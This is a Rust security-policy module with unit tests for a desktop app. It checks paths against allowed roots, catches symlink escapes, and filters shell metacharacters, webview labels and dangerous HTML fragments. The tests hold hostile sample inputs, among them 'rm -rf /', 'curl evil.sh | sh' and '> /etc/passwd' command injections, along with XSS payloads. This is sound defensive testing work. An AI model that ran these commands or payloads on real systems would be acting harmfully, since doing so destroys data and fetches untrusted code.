//! M0-3.a：安全边界最小契约（`SecurityPolicy` 等价模块）。
//!
//! 本检查点只**定义契约**并给出可复跑拒绝用例，**不收口任何调用方**
//! （`launch_app` 归 M0-3.d、路径类命令归 M0-3.c、capability/远程 IPC 归 M0-3.b）。
//! 因此这些函数当前还没有生产调用方；为避免新增编译器警告，模块顶部做了
//! 受控豁免，并在 `main.rs` 启动日志里打印策略指纹（见 `policy_fingerprint`）。
//!
//! 设计原则：
//!   1. 纯函数、无全局状态，便于单测与后续在调用方组合。
//!   2. 默认拒绝：无法判定（如路径不存在、无法规范化）一律 `Err`，不静默放行。
//!   3. 失败信息不含完整用户输入摘要以外的敏感内容，且统一由调用方决定是否记录。

// 契约先行阶段：本模块只被单元测试和启动指纹日志消费。
// M0-3.b/c/d 接入生产调用方后必须删除本豁免并重新核对 warning 基线。
#![allow(dead_code)]

use std::path::PathBuf;

/// 安全策略拒绝原因。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PolicyError {
    /// 路径无法规范化（不存在、权限不足等）：默认拒绝。
    UnresolvablePath(String),
    /// 规范化后不在任何允许根目录内（含 `../` 逃逸）。
    PathOutsideAllowedRoots { path: String, roots: Vec<String> },
    /// 路径中存在符号链接且其目标逃出允许根目录。
    SymlinkEscape { path: String, target: String },
    /// 命令含 shell 元字符，存在注入风险。
    ShellMetacharacter { found: char },
    /// 命令为空。
    EmptyCommand,
    /// 未知/未登记的 webview label（例如早已不存在的 `browser`）。
    UnknownWebviewLabel(String),
    /// HTML 超长。
    HtmlTooLarge { bytes: usize, limit: usize },
    /// HTML 含危险片段。
    DangerousHtml(&'static str),
}

impl std::fmt::Display for PolicyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PolicyError::UnresolvablePath(p) => write!(f, "路径无法解析：{p}"),
            PolicyError::PathOutsideAllowedRoots { path, roots } => {
                write!(f, "路径 {path} 不在允许根目录内：{:?}", roots)
            }
            PolicyError::SymlinkEscape { path, target } => {
                write!(f, "路径 {path} 的符号链接目标 {target} 逃出允许范围")
            }
            PolicyError::ShellMetacharacter { found } => {
                write!(f, "命令含 shell 元字符：{found:?}")
            }
            PolicyError::EmptyCommand => write!(f, "命令为空"),
            PolicyError::UnknownWebviewLabel(label) => write!(f, "未登记的 webview label：{label}"),
            PolicyError::HtmlTooLarge { bytes, limit } => {
                write!(f, "HTML 超长：{bytes} > {limit} 字节")
            }
            PolicyError::DangerousHtml(fragment) => write!(f, "HTML 含危险片段：{fragment}"),
        }
    }
}

/// 单条 HTML 片段的大小上限（契约：超长内容必须显式拒绝，避免 webview 内存被拖垮）。
pub const MAX_HTML_BYTES: usize = 1_048_576; // 1 MiB

/// 已登记的 webview label 规则。刻意**不含** `browser`——
/// 该 label 已从产品实现中移除，但 `src-tauri/capabilities/*.json` 仍残留（见威胁矩阵 SEC-03）。
pub fn is_known_webview_label(label: &str) -> bool {
    if label == "main" {
        return true;
    }
    // tab-<uuid>、grid-<n>、grid-child-<n> 三类由实现动态创建。
    label.starts_with("tab-") || label.starts_with("grid-")
}

/// 校验 webview label 是否登记在册。
pub fn check_webview_label(label: &str) -> Result<(), PolicyError> {
    if is_known_webview_label(label) {
        Ok(())
    } else {
        Err(PolicyError::UnknownWebviewLabel(label.to_string()))
    }
}

/// 校验路径：规范化后必须落在 `roots` 之一内，且不得借符号链接逃逸。
///
/// 判断顺序刻意先 `canonicalize` 再比较前缀，这样 `a/b/../../../etc` 与
/// 「指向外部的软链接」都会被同一套规则拦下。
pub fn check_path_within_roots(path: &str, roots: &[PathBuf]) -> Result<PathBuf, PolicyError> {
    if roots.is_empty() {
        // 没有配置允许根目录 = 策略未就绪，默认拒绝而不是放行。
        return Err(PolicyError::PathOutsideAllowedRoots {
            path: path.to_string(),
            roots: Vec::new(),
        });
    }
    let canonical =
        std::fs::canonicalize(path).map_err(|_| PolicyError::UnresolvablePath(path.to_string()))?;

    // 逐段检查祖先是否为符号链接且其目标逃出允许范围（canonicalize 只解最终路径，
    // 中间目录被替换成软链接的场景需要额外比对）。
    if let Some(parent) = canonical.parent() {
        for ancestor in parent.ancestors() {
            if let Ok(target) = std::fs::read_link(ancestor) {
                let resolved = target
                    .canonicalize()
                    .unwrap_or_else(|_| ancestor.to_path_buf());
                if !roots.iter().any(|root| resolved.starts_with(root)) {
                    return Err(PolicyError::SymlinkEscape {
                        path: path.to_string(),
                        target: resolved.display().to_string(),
                    });
                }
            }
        }
    }

    let in_roots = roots.iter().any(|root| canonical.starts_with(root));
    if in_roots {
        Ok(canonical)
    } else {
        Err(PolicyError::PathOutsideAllowedRoots {
            path: path.to_string(),
            roots: roots.iter().map(|r| r.display().to_string()).collect(),
        })
    }
}

/// 校验 shell 命令：拒绝元字符，避免 `sh -c` 串接出预期外语义。
///
/// 注意：这只是**字符级**最小契约，真正收口要按已解析应用条目执行（M0-3.d），
/// 单靠字符过滤不足以对抗所有注入，因此这里刻意不做「清洗」而只做「拒绝」。
pub fn check_shell_command(cmd: &str) -> Result<(), PolicyError> {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return Err(PolicyError::EmptyCommand);
    }
    for ch in trimmed.chars() {
        if matches!(ch, ';' | '&' | '|' | '`' | '$' | '>' | '<' | '\n' | '\r') {
            return Err(PolicyError::ShellMetacharacter { found: ch });
        }
    }
    Ok(())
}

/// 校验写入 webview 的 HTML 片段：先查长度，再查危险片段。
pub fn check_html(html: &str) -> Result<(), PolicyError> {
    if html.len() > MAX_HTML_BYTES {
        return Err(PolicyError::HtmlTooLarge {
            bytes: html.len(),
            limit: MAX_HTML_BYTES,
        });
    }
    const DANGEROUS: [(&str, &str); 4] = [
        ("<script", "<script"),
        ("javascript:", "javascript:"),
        ("<iframe", "<iframe"),
        ("onerror=", "onerror="),
    ];
    let lower = html.to_ascii_lowercase();
    for (needle, label) in DANGEROUS {
        if lower.contains(needle) {
            return Err(PolicyError::DangerousHtml(label));
        }
    }
    Ok(())
}

/// 策略指纹：启动日志与诊断用，便于确认运行中的二进制对应哪版策略契约。
pub fn policy_fingerprint() -> &'static str {
    "security-policy-v1/max_html=1MiB/labels=main,tab-*,grid-*"
}

/// 便捷入口：把「路径 + 用户意图」合成一次判定（M0-3.b 收口远程 IPC 时使用）。
pub struct Decision {
    pub allowed: bool,
    pub reason: Option<PolicyError>,
}

impl Decision {
    pub fn allow() -> Self {
        Self {
            allowed: true,
            reason: None,
        }
    }
    pub fn deny(reason: PolicyError) -> Self {
        Self {
            allowed: false,
            reason: Some(reason),
        }
    }
}

#[cfg(test)]
mod security_policy_tests {
    use super::*;
    use std::fs;

    fn temp_root(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("m0-3a-{}-{}", tag, std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).expect("创建临时根目录");
        dir
    }

    // ---------- webview label ----------

    #[test]
    fn known_labels_are_accepted() {
        for label in ["main", "tab-8f2c", "grid-0", "grid-child-3"] {
            assert!(
                check_webview_label(label).is_ok(),
                "{label} 应属于已登记 label"
            );
        }
    }

    #[test]
    fn stale_browser_label_is_rejected() {
        // 威胁矩阵 SEC-03：capabilities 里仍残留 `browser`，产品已无此 label。
        assert!(!is_known_webview_label("browser"));
        assert_eq!(
            check_webview_label("browser"),
            Err(PolicyError::UnknownWebviewLabel("browser".to_string()))
        );
    }

    // ---------- 路径边界 ----------

    #[test]
    fn path_inside_allowed_root_is_accepted() {
        let root = temp_root("inside");
        let file = root.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let roots = vec![root.clone()];
        let resolved = check_path_within_roots(file.to_str().unwrap(), &roots)
            .expect("允许根目录内的路径应放行");
        assert!(resolved.starts_with(&root));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn parent_traversal_is_rejected() {
        let root = temp_root("traversal");
        fs::create_dir_all(root.join("sub")).expect("创建子目录");
        let escape = root.join("sub").join("..").join("..").join("etc");
        let roots = vec![root.clone()];
        let err = check_path_within_roots(escape.to_str().unwrap(), &roots)
            .expect_err("../ 逃逸必须被拒绝");
        assert!(
            matches!(err, PolicyError::PathOutsideAllowedRoots { .. })
                || matches!(err, PolicyError::UnresolvablePath(_)),
            "实际错误：{err:?}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn symlink_escape_is_rejected() {
        let root = temp_root("symlink");
        let outside = temp_root("symlink-outside");
        let link = root.join("escape-link");
        #[cfg(unix)]
        std::os::unix::fs::symlink(&outside, &link).expect("创建符号链接");
        #[cfg(not(unix))]
        {
            let _ = (&outside, &link);
            return; // 非 Unix 无符号链接语义，跳过
        }
        let roots = vec![root.clone()];
        let err = check_path_within_roots(link.to_str().unwrap(), &roots)
            .expect_err("符号链接逃逸必须被拒绝");
        assert!(
            matches!(err, PolicyError::SymlinkEscape { .. })
                || matches!(err, PolicyError::PathOutsideAllowedRoots { .. }),
            "实际错误：{err:?}"
        );
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    fn empty_roots_deny_everything() {
        let root = temp_root("empty-roots");
        let file = root.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let err = check_path_within_roots(file.to_str().unwrap(), &[])
            .expect_err("未配置允许根目录时默认拒绝");
        assert!(matches!(err, PolicyError::PathOutsideAllowedRoots { .. }));
        let _ = fs::remove_dir_all(&root);
    }

    // ---------- shell 命令 ----------

    #[test]
    fn plain_commands_are_accepted() {
        for cmd in ["/usr/bin/code", "code", "google-chrome --new-window"] {
            assert!(check_shell_command(cmd).is_ok(), "{cmd} 不含元字符，应放行");
        }
    }

    #[test]
    fn shell_metacharacters_are_rejected() {
        for cmd in [
            "code; rm -rf /",
            "code && curl evil.sh | sh",
            "code `whoami`",
            "code $(id)",
            "code > /etc/passwd",
            "code\nrm -rf /",
        ] {
            let err = check_shell_command(cmd).expect_err("含元字符的命令必须被拒绝");
            assert!(
                matches!(err, PolicyError::ShellMetacharacter { .. }),
                "{cmd} 应判为元字符，实际：{err:?}"
            );
        }
        assert_eq!(check_shell_command("   "), Err(PolicyError::EmptyCommand));
    }

    // ---------- HTML ----------

    #[test]
    fn oversized_html_is_rejected() {
        let huge = "a".repeat(MAX_HTML_BYTES + 1);
        assert!(matches!(
            check_html(&huge),
            Err(PolicyError::HtmlTooLarge { .. })
        ));
    }

    #[test]
    fn dangerous_html_fragments_are_rejected() {
        for html in [
            "<script>alert(1)</script>",
            "<a href=\"javascript:alert(1)\">x</a>",
            "<iframe src=\"https://evil\"></iframe>",
            "<img src=x onerror=alert(1)>",
        ] {
            assert!(
                matches!(check_html(html), Err(PolicyError::DangerousHtml(_))),
                "{html} 必须被拒绝"
            );
        }
        assert!(check_html("<div>安全内容</div>").is_ok());
    }

    #[test]
    fn decision_helpers_carry_reason() {
        let allow = Decision::allow();
        assert!(allow.allowed && allow.reason.is_none());
        let deny = Decision::deny(PolicyError::EmptyCommand);
        assert!(!deny.allowed);
        assert_eq!(deny.reason, Some(PolicyError::EmptyCommand));
        assert!(policy_fingerprint().contains("security-policy-v1"));
    }
}
